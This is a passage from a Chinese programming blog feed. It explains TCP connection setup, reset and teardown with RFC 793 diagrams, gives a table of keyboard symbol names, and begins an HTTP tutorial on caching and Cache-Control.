<li>TCP A 请求 TCP B 建立连接，发送序列号为 100，控制位为 SYN，则 100 为初始序列号，此时 TCP A 进入 SYN-SENT 状态</li>
<li>TCP B 接收到 TCP A 发送的连接请求，发送确认请求，序列号为 300，确认号为 101，控制位为 SYN、ACK，则 TCP B 初始序列号为 300，期望下次接收的 TCP A 数据包序列号为 101，此时 TCP B 进入 SYN-RECEIVED 状态</li>
<li>TCP A 收到 TCP B 发送的确认请求，进入 ESTABLISHED 状态，并向 TCP B 发送确认请求，序列号为 101，确认号为 301，控制位为 ACK，TCP B 收到 TCP A 的确认请求后也进入 ESTABLISHED 状态，至此三次握手完成，可以可靠地传输数据。</li>
<li>TCP A 向 TCP B 发送数据，由于 4、5 都是 TCP A 向 TCP B 发送，且序列号与确认号不变，故可以在 4 中就带上数据一起发送</li>
</ol>
<h3 id="TCP-连接异常处理"><a href="#TCP-连接异常处理" class="headerlink" title="TCP 连接异常处理"></a>TCP 连接异常处理</h3><blockquote>
<p>The principle reason for the three-way handshake is to prevent old duplicate connection initiations from causing confusion.  To deal with this, a special control message, reset, has been devised.  If the receiving TCP is in a  non-synchronized state (i.e., SYN-SENT, SYN-RECEIVED), it returns to LISTEN on receiving an acceptable reset. If the TCP is in one of the synchronized states (ESTABLISHED, FIN-WAIT-1, FIN-WAIT-2, CLOSE-WAIT, CLOSING, LAST-ACK, TIME-WAIT), it aborts the connection and informs its user.  We discuss this latter case under “half-open” connections below.</p>
</blockquote>
<p>三次握手的主要原因是为了防止建立旧的重复的连接所导致的混乱。为了处理这种情况，发明了特殊的控制位信息 reset（RST）。如果接收中的 TCP 连接正处于非同步状态（比如 SYN_SENT, SYN-RECEIVED），它会在收到 reset 后返回 LISTEN 状态。而如果 TCP 连接处于同步状态如（ESTABLISHED, FIN-WAIT-1, FIN-WAIT-2, CLOSE-WAIT, CLOSING, LAST-ACK, TIME-WAIT），它会中止连接并告知用户。我们会在“半连接”中讨论后一种情况。</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">    TCP A                                                   TCP B

1.  CLOSED                                                  LISTEN

2.  SYN-SENT     -->  &lt;SEQ=100>&lt;CTL=SYN>               ...

3.  (duplicate)  ...  &lt;SEQ=90>&lt;CTL=SYN>                -->  SYN-RECEIVED

4.  SYN-SENT     &lt;--  &lt;SEQ=300>&lt;ACK=91>&lt;CTL=SYN,ACK>   &lt;--  SYN-RECEIVED

5.  SYN-SENT     -->  &lt;SEQ=91>&lt;CTL=RST>                -->  LISTEN

6.               ...  &lt;SEQ=100>&lt;CTL=SYN>               -->  SYN-RECEIVED

7.  SYN-SENT     &lt;--  &lt;SEQ=400>&lt;ACK=101>&lt;CTL=SYN,ACK>  &lt;--  SYN-RECEIVED

8.  ESTABLISHED  -->  &lt;SEQ=101>&lt;ACK=401>&lt;CTL=ACK>      -->  ESTABLISHED

                  Recovery from Old Duplicate SYN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>TCP A 处于 CLOSE 状态，TCP B 处于 LISTEN 状态</li>
<li>TCP A 发送连接请求，但尚未到达 TCP B</li>
<li>TCP A 之前发送的旧的重复连接请求先于本次请求到达了 TCP B</li>
<li>TCP B 无法分辨是否为旧的重复请求，正常回应</li>
<li>TCP A 发现 TCP B 回复了旧的重复请求，发送重置请求，TCP B 接收到后重回 LISTEN 状态</li>
<li>TCP A 本次正常请求到达 TCP B，进入正常的三次握手流程</li>
</ol>
<blockquote>
<p>Half-Open Connections and Other Anomalies<br>An established connection is said to be  “half-open” if one of the TCPs has closed or aborted the connection at its end without the knowledge of the other, or if the two ends of the connection have become desynchronized owing to a crash that resulted in loss of memory.  Such connections will automatically become reset if an attempt is made to send data in either direction. However, half-open  connections are expected to be unusual, and the recovery procedure is mildly involved.</p>
</blockquote>
<p>半开连接与其他异常</p>
<p>当一个已经建立的 TCP 连接其中一方关闭或终止了连接但没有告知另一方时，或者双方连接由于内存丢失崩溃导致不再同步时，我们称之为半连接。当我们试图在半连接上任意方向发送数据时，半连接将会自动重置。不论如何，半连接是不正常的，恢复进程将会温和介入。</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">    TCP A                                            TCP B

1.  (CRASH)                                          (send 300,receive 100)

2.  CLOSED                                           ESTABLISHED

3.  SYN-SENT  -->  &lt;SEQ=400>&lt;CTL=SYN>           -->  (??)

4.  (!!)      &lt;--  &lt;SEQ=300>&lt;ACK=100>&lt;CTL=ACK>  &lt;--  ESTABLISHED

5.  SYN-SENT  -->  &lt;SEQ=100>&lt;CTL=RST>           -->  (Abort!!)

6.  SYN-SENT                                         CLOSED

7.  SYN-SENT  -->  &lt;SEQ=400>&lt;CTL=SYN>           -->

                   Half-Open Connection Discovery<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>已建立的连接中，TCP A 崩溃了，TCP B 下一个发送的包序列号为 300，确认号为 100</li>
<li>TCP A 重启后处于关闭状态，TCP B 依然是 ESTABLISHED 状态，这是一个半连接</li>
<li>TCP A 发送请求重新建立连接，TCP B 还处于同步状态，未返回确认请求</li>
<li>TCP B 移动数据发送窗口，继续发送下一个数据分片</li>
<li>TCP A 发现 TCP B 仍处于同步状态，向 TCP B 发送重置请求，TCP B 收到重置请求后中断连接</li>
<li>TCP A 处于 SYN-SENT 状态，TCP B 处于关闭状态</li>
<li>TCP A 继续发送连接请求，进入正常三次握手过程</li>
</ol>
<h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><blockquote>
<p>CLOSE is an operation meaning “I have no more data to send.”  The notion of closing a full-duplex connection is subject to ambiguous interpretation, of course, since it may not be obvious how to treat the receiving side of the connection.  We have chosen to treat CLOSE in a simplex fashion.  The user who CLOSEs may continue to RECEIVE until he is told that the other side has CLOSED also.  Thus, a program could initiate several SENDs followed by a CLOSE, and then continue to RECEIVE until signaled that a RECEIVE failed because the other side has CLOSED.  We assume that the TCP will signal a user, even if no RECEIVEs are outstanding, that the other side has closed, so the user can terminate his side gracefully.  A TCP will reliably deliver all buffers SENT before the connection was CLOSED so a user who expects no data in return need only wait to hear the connection was CLOSED successfully to know that all his data was received at the destination TCP.  Users must keep reading connections they close for sending until the TCP says no more data.</p>
</blockquote>
<p>关闭连接的操作表示“我没有更多的数据要发送了”。关闭的概念在全双工连接下是一种易混淆的表述，因为如何处理接收方的连接并不明确。我们选择将关闭连接做为一种单一模式处理。关闭方依然能够接收数据，直到它被告知另一方也关闭了连接。这样一个程序就能够发起几个发送请求后再关闭，并继续接收数据直到因为另一方关闭连接而接收失败。我们假定即使另一方已经关闭，没有明确的要接收的数据包了，TCP 将会告知用户，优雅地关闭用户方的连接。TCP 能够在关闭连接前可靠地发送所有缓存区待发送的数据，这样用户期望没有数据返回时，只需要等待接收连接成功关闭的信号，以知晓它所有的数据都被目标方的 TCP 接收。用户必需继续读取他们他们已经发送关闭的连接，直到 TCP 告知没有更多的数据了。</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">    TCP A                                                  TCP B

1.  ESTABLISHED                                            ESTABLISHED

2.  (Close)
    FIN-WAIT-1  -->  &lt;SEQ=100>&lt;ACK=300>&lt;CTL=FIN,ACK>  -->  CLOSE-WAIT

3.  FIN-WAIT-2  &lt;--  &lt;SEQ=300>&lt;ACK=101>&lt;CTL=ACK>      &lt;--  CLOSE-WAIT

4.                                                         (Close)
    TIME-WAIT   &lt;--  &lt;SEQ=300>&lt;ACK=101>&lt;CTL=FIN,ACK>  &lt;--  LAST-ACK

5.  TIME-WAIT   -->  &lt;SEQ=101>&lt;ACK=301>&lt;CTL=ACK>      -->  CLOSED

6.  (2 MSL)
    CLOSED

                       Normal Close Sequence<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>正常的 TCP 关闭流程（四次挥手）</p>
<ol>
<li>TCP A 与 TCP B 都是 ESTABLISHED 状态</li>
<li>TCP A 已发送完所有数据，准备关闭连接，发送带有 FIN 控制位的关闭请求，此时 TCP A 不能再发送数据，但仍然可以接收</li>
<li>TCP B 接收到 FIN 请求，向 TCP A 发送确认请求，TCP B 进入 CLOSE-WAIT 状态，此时 TCP B 会判断缓存区是否还有数据要发送，若有则继续发送数据给 TCP A</li>
<li>TCP B 发现所有数据都发送完成或已经没有数据要发送了，则会向 TCP A 发送带有 FIN 控制位的关闭请求，TCP B 进入 LAST-ACK 状态</li>
<li>TCP A 收到 TCP B 的关闭请求，并向 TCP B 发送关闭请求的确认请求，此时 TCP A 进入 TIME-WAIT 状态，TCP B 收到确认请求后关闭连接</li>
<li>进入 TIME-WAIT 状态的 TCP A 经过两个最大分片生存时间后确保 TCP B 已经关闭连接，也关闭自身连接，进入 CLOSED 状态</li>
</ol>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">    TCP A                                                   TCP B

1.  ESTABLISHED                                             ESTABLISHED

2.  (Close)                                                 (Close)
    FIN-WAIT-1   -->  &lt;SEQ=100>&lt;ACK=300>&lt;CTL=FIN,ACK>  ...  FIN-WAIT-1
                 &lt;--  &lt;SEQ=300>&lt;ACK=100>&lt;CTL=FIN,ACK>  &lt;--
                 ...  &lt;SEQ=100>&lt;ACK=300>&lt;CTL=FIN,ACK>  -->

3.  CLOSING      -->  &lt;SEQ=101>&lt;ACK=301>&lt;CTL=ACK>      ...  CLOSING
                 &lt;--  &lt;SEQ=301>&lt;ACK=101>&lt;CTL=ACK>      &lt;--
                 ...  &lt;SEQ=101>&lt;ACK=301>&lt;CTL=ACK>      -->

4.  TIME-WAIT                                               TIME-WAIT
    (2 MSL)                                                 (2 MSL)
    CLOSED                                                  CLOSED

                    Simultaneous Close Sequence<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同时关闭 TCP 流程</p>
<ol>
<li>TCP A 与 TCP B 同时处于 ESTABLISHED 状态</li>
<li>TCP A 与 TCP B 同时向对方发送带有 FIN 控制位的关闭连接请求，双方在请求发送后都进入了 FIN-WAIT-1 状态</li>
<li>TCP A 与 TCP B 都收到了对方的关闭连接请求，并向对方发送了对于关闭连接的确认请求，这时双方都进入了 CLOSING 状态</li>
<li>TCP A 与 TCP B 都收到对方的确认请求后，进入了 TIME-WAIT 状态，等待两个最大分片生存时间后进入关闭状态</li>
</ol>
<h4 id="为什么要四次挥手"><a href="#为什么要四次挥手" class="headerlink" title="为什么要四次挥手"></a>为什么要四次挥手</h4><p>建立连接时都可以只用三次握手，为什么关闭连接确要四次挥手？核心原因就是TCP连接的关闭是不能发送却仍能接收的半关闭。当TCP A向TCP B发送FIN控制位的关闭连接请求后，TCP A不再接收数据，仍能接收数据。而TCP B收到FIN请求后，可能还有缓存的数据要发送，因此只能先发送ACK请求，表示收到了FIN请求，再将缓存的数据发送完成后，才能再向TCP A发送FIN请求。由于可能有缓存数据发送的原因，导致第二次挥手和第三次挥手不能如同建立连接时的第二次握手那样合二为一。</p>
<h4 id="为什么要有2ML的TIME-WAIT时间"><a href="#为什么要有2ML的TIME-WAIT时间" class="headerlink" title="为什么要有2ML的TIME-WAIT时间"></a>为什么要有2ML的TIME-WAIT时间</h4><p>由于TCP A发送给TCP B最后的ACK请求可能丢失，TCP B未收到ACK请求，会重传FIN请求给TCP A，这个过程的最大耗时即两个最大报文生存时间，超过这个时间TCP A就可以认为TCP B收到了ACK请求，也就可以关闭连接了</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>键盘上的特殊符号</title>
    <url>/2021/07/14/%E9%94%AE%E7%9B%98%E4%B8%8A%E7%9A%84%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>符号</th>
<th>英文名</th>
<th>中文名</th>
</tr>
</thead>
<tbody><tr>
<td>~</td>
<td>tilde or swung dash</td>
<td>波浪字符或代字号</td>
</tr>
<tr>
<td>`</td>
<td>Acute, Back quote, grave, grave accent, left quote, open quote, or a push</td>
<td>锐音符</td>
</tr>
<tr>
<td>!</td>
<td>Exclamation mark, Exclamation point, or Bang</td>
<td>惊叹号</td>
</tr>
<tr>
<td>@</td>
<td>Ampersat, Arobase, Asperand, At, At symbol or commercial at</td>
<td>爱特或小老鼠</td>
</tr>
<tr>
<td>#</td>
<td>Octothorpe, Number, Pound, sharp, or Hash</td>
<td>井号</td>
</tr>
<tr>
<td>£</td>
<td>Pounds Sterling or Pound symbol</td>
<td>英镑</td>
</tr>
<tr>
<td>€</td>
<td>Euro</td>
<td>欧元</td>
</tr>
<tr>
<td>$</td>
<td>dollar sign</td>
<td>美元符</td>
</tr>
<tr>
<td>¢</td>
<td>Cent sign</td>
<td>美分</td>
</tr>
<tr>
<td>¥</td>
<td>Japanese Yen</td>
<td>日元</td>
</tr>
<tr>
<td>§</td>
<td>Micro or</td>
<td>Section</td>
</tr>
<tr>
<td>%</td>
<td>percent sign</td>
<td>百分号</td>
</tr>
<tr>
<td>°</td>
<td>Degree</td>
<td>度</td>
</tr>
<tr>
<td>^</td>
<td>caret or Circumflex</td>
<td>脱字符</td>
</tr>
<tr>
<td>&amp;</td>
<td>Ampersand, Epershand, or And</td>
<td>与和符</td>
</tr>
<tr>
<td>*</td>
<td>Asterisk and sometimes referred to as star.</td>
<td>星号</td>
</tr>
<tr>
<td>()</td>
<td>open close parentheses, round brackets, soft brackets, or circle brackets</td>
<td>小括号，圆括号</td>
</tr>
<tr>
<td>[]</td>
<td>open close brackets (US), square brackets, closed brackets or hard brackets</td>
<td>中括号，方括号</td>
</tr>
<tr>
<td>{}</td>
<td>open close braces (UK and US), French brackets, curly brackets</td>
<td>大括号，花括号</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>angle brackets or chevrons</td>
<td>尖括号</td>
</tr>
<tr>
<td>_</td>
<td>underscore</td>
<td>下划线</td>
</tr>
<tr>
<td>+</td>
<td>plus sign</td>
<td>加号</td>
</tr>
<tr>
<td>−</td>
<td>Hyphen, Minus or Dash</td>
<td>减号</td>
</tr>
<tr>
<td>=</td>
<td>equals sign</td>
<td>等号</td>
</tr>
<tr>
<td>&lt;</td>
<td>Less Than or Angle brackets</td>
<td>小于号</td>
</tr>
<tr>
<td>&gt;</td>
<td>Greater Than or Angle brackets</td>
<td>大于号</td>
</tr>
<tr>
<td>.</td>
<td>period, full stop or dot</td>
<td>句号，点</td>
</tr>
<tr>
<td>,</td>
<td>comma</td>
<td>逗号</td>
</tr>
<tr>
<td>:</td>
<td>colon</td>
<td>冒号</td>
</tr>
<tr>
<td>;</td>
<td>semicolon</td>
<td>分号</td>
</tr>
<tr>
<td>?</td>
<td>question mark</td>
<td>问号</td>
</tr>
<tr>
<td>-</td>
<td>hyphen</td>
<td>连字符</td>
</tr>
<tr>
<td>…</td>
<td>ellipsis</td>
<td>省略号</td>
</tr>
<tr>
<td>–</td>
<td>dash</td>
<td>破折号</td>
</tr>
<tr>
<td>/</td>
<td>Forward slash, Solidus, Virgule, or Whack</td>
<td>斜线</td>
</tr>
<tr>
<td>\</td>
<td>Backslash or Reverse Solidus</td>
<td>反斜线</td>
</tr>
<tr>
<td></td>
<td>Pipe, Or, or Vertical bar</td>
<td>竖线</td>
</tr>
<tr>
<td>“</td>
<td>Quote, Quotation mark, or Inverted commas</td>
<td>双引号</td>
</tr>
<tr>
<td>‘</td>
<td>Apostrophe or Single Quote</td>
<td>单引号，省略符号</td>
</tr>
</tbody></table>
<blockquote>
<p>参考资料 <a href="https://github.com/bingoohuang/blog/issues/131">键盘上的特殊字符都叫啥</a></p>
</blockquote>
]]></content>
      <categories>
        <category>特殊符号</category>
      </categories>
      <tags>
        <tag>特殊符号</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络HTTP协议</title>
    <url>/2020/03/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CHTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>写在前面：在前后端分离的理念越来越普及的今天，作为一个前端开发，除了前端技术水平要过硬外，最需要花时间学习的莫过于 HTTP 协议。因为前后端分离后，基于 HTTP 协议的 ajax 请求是前后端交互的桥梁，对 HTTP 协议了解的缺失将造成前后端交互与协作的极大麻烦。这一点对初学者尤为重要，在学好 HTML、CSS、JavaScript 与一个现代框架的基础上，一定要花一定的时间学习 HTTP 协议。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP（Hyper Text Transfer Protocol）即超文本传输协议。</p>
<ul>
<li><p>它是一种 client-server 协议，通常是由浏览器这样的接受方发起，旨在获得文本、图片、视频、布局描述、脚本等 Web 文档。</p>
</li>
<li><p>HTTP 协议是一种可扩展协议，在网络模型中是基于 TCP 的应用层协议。</p>
</li>
</ul>
<span id="more"></span>

<h3 id="基于-HTTP-的组件系统"><a href="#基于-HTTP-的组件系统" class="headerlink" title="基于 HTTP 的组件系统"></a>基于 HTTP 的组件系统</h3><ol>
<li><p>客户端（user-agent）：发起一个请求（requests）的实体，通常是浏览器</p>
</li>
<li><p>服务端：对客户端请求做出响应（response）的实体，通常是服务器</p>
</li>
<li><p>代理（proxies）：在客户端与服务端之间转发 HTTP 消息的设备，代理可以是透明的，也可以是不透明的（改变请求）。代理主要有如下作用：</p>
<ul>
<li><p>缓存</p>
</li>
<li><p>过滤</p>
</li>
<li><p>负载均衡</p>
</li>
<li><p>认证</p>
</li>
<li><p>日志记录</p>
</li>
</ul>
</li>
</ol>
<h3 id="HTTP-的基本性质"><a href="#HTTP-的基本性质" class="headerlink" title="HTTP 的基本性质"></a>HTTP 的基本性质</h3><ul>
<li><p>简单：虽然 HTTP/2 将 HTTP 消息封装到了帧（frames）中，但是 HTTP 大体上设计还是简单易读的。</p>
</li>
<li><p>可扩展：HTTP/1.0 版本中 HTTP headers 让协议扩展变得非常容易。只要服务端和客户端就新的 headers 达成语义一致，新功能就可以被轻松地加入进来。</p>
</li>
<li><p>无状态、有会话：在同一个连接中，两个执行成功的请求之间是没有关系的。这就造成同一个用户没法在同一个网站中进行连续的交互，如用户连续添加两个商品至购物车的两个请求没有关系，那么就无法知道用户购物车中到底有什么商品。那么使用 HTTP 头部扩展 HTTP Cookies 就可以解决这个问题，将 Cookies 添加到头部信息中，创建一个会话让用户的每次请求都能共享同样的上下文信息，以达成相同的状态。总结：HTTP 本身是无状态的，但是通过 Cookies 创建了有状态的会话。</p>
</li>
<li><p>HTTP 与连接：连接是由传输层控制的，而 HTTP 是应用层，并不是 HTTP 协议的范围。HTTP 本身并不需要传输层协议是面向连接的，只需要传输层是可靠的，传输层中主要有 TCP 与 UDP 两大协议，TCP 协议是可靠的，因此 HTTP 基于面向连接的 TCP 协议进行消息传递，但连接并非必需的。</p>
<p>在客户端与服务器能够交互前，必需先建立 TCP 连接，由于 TCP 连接的建立要三次握手，是耗时的。HTTP/1.0 默认为每一对 HTTP 请求与响应建立一个单独的 TCP 连接，当需要发起多个请求时，这种模式比多个请求复用同一个连接更低效。</p>
<p>为了解决这个问题 HTTP/1.1 引入了管道（被证明难以实现）和持久连接的概念：即底层的 TCP 连接可以通过 HTTP 头部的 Connection 来控制，保持连接。HTTP/2 则实现了多路复用同一个连接，来使 HTTP 更高效。</p>
<p>前面也说到 HTTP 并不需要面向连接的传输层协议，因此更加适合 HTTP 的协议也一直在研究与设计，Google 以 UDP 协议为基础，设计出了更高效的传输协议 QUIC。</p>
</li>
</ul>
<h3 id="HTTP-能控制什么"><a href="#HTTP-能控制什么" class="headerlink" title="HTTP 能控制什么"></a>HTTP 能控制什么</h3><p>良好的扩展性使得越来越多的 Web 功能归 HTTP 控制，缓存与认证很早就归 HTTP 控制了，同源同域的限制到 2010 年才改变。</p>
<p>可以被 HTTP 控制的常见特性：</p>
<ul>
<li><p>缓存：服务端能告诉代理与客户端哪些文件需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。</p>
</li>
<li><p>开放同源限制：为防止网络窥探和其它隐私泄漏，浏览器强制对 Web 网站做了分割限制。只有来自相同来源的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP 可以通过修改头部来开放这样的限制，因此 Web 文档可以是由不同域下的信息拼接而成的（某些情况下，这样做还有出于安全因素的考虑）。前后端分离、文档资源与多媒体资源的分离，都使得开放同源策略限制变得尤为重要。</p>
</li>
<li><p>认证：一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过 HTTP 的 Authenticate 头部提供，或者使用 HTTP Cookies 来设置指定的会话。</p>
</li>
<li><p>代理与隧道：通常服务器与客户端都是处于内网的，对外网隐藏了真实的 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS 协议的代理就运作在更底层，像 FTP 这样的协议也能够被它们处理。</p>
</li>
<li><p>会话：虽然 HTTP 是无状态协议，但使用 HTTP Cookies 允许客户端用一个服务端的状态发起请求，这就创建了会话，使得任何网站都能轻松为用户定制展示的内容了。</p>
</li>
</ul>
<h3 id="HTTP-流"><a href="#HTTP-流" class="headerlink" title="HTTP 流"></a>HTTP 流</h3><p>客户端与服务端进行信息交互时的过程：</p>
<ol>
<li><p>打开一个 TCP 连接：TCP 连接被用来发送一条或多条请求，以及接收响应消息。客户端可能打开一条新的连接，或重用一个已经存在的连接，或者也可能开几个新的 TCP 连接连向服务端。</p>
</li>
<li><p>发送一个 HTTP 报文：HTTP 报文（在 HTTP/2 前）是语义可读的。在 HTTP/2 中，这些简单的消息被封装在帧中，使得报文不能被直接读取，但原理仍然相同。</p>
</li>
<li><p>读取服务端返回的报文信息。</p>
</li>
<li><p>关闭连接或者为后续请求重用连接。</p>
</li>
</ol>
<p>当 HTTP 管道激活时，后续请求都无需等待第一个请求的成功响应就被发送。但由于现有网络中有很多老旧的软件与现代版本的软件共存，使得管道很难在现有网络中实现。因此 HTTP 管道已经被多请求时有更稳健表现的 HTTP/2 帧所取代。</p>
<h3 id="HTTP-报文"><a href="#HTTP-报文" class="headerlink" title="HTTP 报文"></a>HTTP 报文</h3><p>HTTP/1.1 以及更早的 HTTP 协议报文都是语义可读的。在 HTTP/2 中，这些报文被嵌入到了新的二进制结构——帧。帧允许实现很多优化，比如报文头部的压缩和复用。即使只有原始 HTTP 报文的一部分以 HTTP/2 发送出来，每条报文的语义依旧不变，客户端会重组原始 HTTP/1.1 请求。因此用 HTTP/1.1 格式来理解 HTTP/2 报文仍旧有效。</p>
<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><p>请求的组成：</p>
<ul>
<li><p>HTTP method，通常是一个动词（GET、POST）或名词（OPTIONS、HEAD）来定义客户端的动作行为。通常客户端的操作都是获取资源（GET 方法）或者发送 HTML form 表单值（POST 方法）。</p>
</li>
<li><p>要获取资源的路径，通常是上下文显而易见的元素中的资源 URL，它没有协议、域名或 TCP 的端口。简单地理解就是一个相对路径。</p>
</li>
<li><p>HTTP 协议版本号。</p>
</li>
<li><p>向服务端表明其他额外信息的可选头部。</p>
</li>
<li><p>对于 POST 这类的方法，报文的 body 就包含了发送的数据，这与响应报文的 body 类似。</p>
</li>
</ul>
<h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><p>响应的组成：</p>
<ul>
<li><p>HTTP 协议版本号。</p>
</li>
<li><p>一个状态码（status code），来告知对应请求执行成功或失败，及失败的原因。</p>
</li>
<li><p>一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。</p>
</li>
<li><p>HTTP headers，与请求头部类似。</p>
</li>
<li><p>可选项，body，比起请求报文，响应报文中包含 body 更常见。</p>
</li>
</ul>
<h3 id="基于-HTTP-的-APIs"><a href="#基于-HTTP-的-APIs" class="headerlink" title="基于 HTTP 的 APIs"></a>基于 HTTP 的 APIs</h3><p>基于 HTTP 的最常用的 API 是 XMLHttpRequest API，可用于在客户端与服务器间交换数据。现代的 Fetch API 提供相同的功能，并具有更强大和灵活的功能集。</p>
<p>另一种 API，即服务器发送的事件，是一种单向服务，允许服务器使用 HTTP 作为传输机制向客户端发送事件。使用 EventSource 接口，客户端打开连接并建立事件句柄。客户端浏览器自动将到达 HTTP 流的消息转换为适当的 Event 对象，并将它们传递给专门处理这类事件的句柄。若处理相应事件的句柄未建立，就会交给 onmessage 事件处理程序处理。</p>
<h2 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h2><p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 Web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去服务器重新下载。这样带来的好处有：缓解服务器端压力，减少延迟与网络阻塞，能够有效提升网站与应用的性能，进而减少显示某资源所用的时间。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。</p>
<p>缓存按所有者分类：私有与公共缓存。</p>
<ul>
<li><p>私有缓存——浏览器缓存</p>
<p>私有缓存只能用于单独用户。你可能已经见过浏览器设置中的缓存选项。浏览器缓存拥有用户通过 HTTP 下载的所有文档。这些缓存为浏览过的文档提供向后、向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。</p>
</li>
<li><p>公共缓存——代理缓存</p>
<p>共享缓存可以被多个用户使用。例如 ISP 可能会架设一个 Web 代理来作为本地网络基础的一部分提供给用户。这样热门资源就会被重复使用，减少网络拥堵与延迟。</p>
</li>
</ul>
<p>缓存按功能分类：强缓存与协商缓存。</p>
<ul>
<li><p>强缓存：命中后直接从缓存中读取资源，不向服务端请求。</p>
</li>
<li><p>协商缓存：命中后会向服务端请求确认资源是否过期。</p>
</li>
</ul>
<h3 id="缓存操作的目标"><a href="#缓存操作的目标" class="headerlink" title="缓存操作的目标"></a>缓存操作的目标</h3><p>虽然 HTTP 缓存不是必需的，但重用缓存资源通常是必要的。然而常见的 HTTP 缓存只能存储 GET 响应，对于其他类型的响应则无能为力。缓存的关键主要包括 request method 和目标 URI。</p>
<p>常见的缓存例子：</p>
<ul>
<li><p>一个检索请求的成功响应：响应状态码为 200 的成功 GET 请求。如 HTML 文档、图片、文件的响应。</p>
</li>
<li><p>永久重定向：响应状态码为 301 的响应。</p>
</li>
<li><p>错误响应：响应状态码为 404 的页面。</p>
</li>
<li><p>不完全响应：响应状态码为 206 的只返回局部信息的响应。</p>
</li>
<li><p>除 GET 请求的响应外，响应信息头中带有 Cache-Control 键的响应</p>
</li>
</ul>
<h3 id="Cache-Control-头部（强缓存）"><a href="#Cache-Control-头部（强缓存）" class="headerlink" title="Cache-Control 头部（强缓存）"></a>Cache-Control 头部（强缓存）</h3><p>HTTP/1.1 定义的 Cache-Control 头用来区分对缓存机制的支持情况，请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。</p>
<table>
<thead>
<tr>
<th>可选值</th>
<th>用于</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>仅响应</td>
<td>响应可以被任何对象缓存（包括发送请求的客户端、代理服务器等），即使是通常不可缓存的内容（例如非 GET 方法的请求）</td>
</tr>
<tr>
<td>private</td>
<td>仅响应</td>
<td>响应只能被单个用户缓存（如对应用户的本地浏览器），不能作为公共缓存（即代理服务器不能缓存）</td>
</tr>
<tr>
<td>no-cache</td>
<td>请求与响应</td>
<td>相当于 max-age=0 的情况，即将响应缓存下来，但每次请求都会当作缓存已过期，向服务端验证缓存是否有更新，无更新返回 304 使用缓存，有更新正常返回 200。（协商缓存验证）</td>
</tr>
<tr>
<td>no-store</td>
<td>请求与响应</td>
<td>不使用任何缓存</td>
</tr>
<tr>
<td>max-age=&lt;seconds&gt;</td>
<td>请求与响应</td>
<td>设置缓存存储的最大周期，超过这个时间缓存被认为过期（单位：秒）。该设置是相对请求发起时间的秒数，另外该指令会使 Expires 头被忽略</td>
</tr>
<tr>
<td>s-maxage=&lt;seconds&gt;</td>
<td>仅响应</td>
<td>功能与 max-age 相同，会覆盖 max-age 或 Expires 头，但仅适用于公共缓存（代理服务器），私有缓存（浏览器）会忽略它，另外该指令会使 Expires 头被忽略</td>
</tr>
<tr>
<td>must-revalidate</td>
<td>仅响应</td>
<td>一旦资源过期，在成功向服务器验证前，缓存不能使用该资源响应后续请求</td>
</tr>
<tr>
<td>proxy-revalidate</td>
<td>仅响应</td>
<td>功能与 must-revalidate 相同，但仅适用于公共缓存（代理服务器），私有缓存（浏览器）会忽略它</td>
</tr>
<tr>
<td>no-transform</td>
<td>请求与响应</td>
<td>不得对资源进行转换或转变。Content-Encoding、Content-Range、Content-Type 等 HTTP 头不能由代理修改。例如，非透明代理可能对图像格式进行转换，以便节省缓存空间或者减少缓慢链路上的流量。no-transform 指令则不允许这样做</td>
</tr>
<tr>
<td>max-stale[=&lt;seconds&gt;]</td>
<td>仅请求</td>
<td>表明客户端愿意接收一个已经过期的资源。可以设置一个可选秒数，表示响应不能过期超过给定的时间</td>
</tr>
<tr>
<td>min-fresh=&lt;seconds&gt;</td>
<td>仅请求</td>
<td>表示客户端希望获取一个能在指定秒数内保持最新状态的响应</td>
</tr>
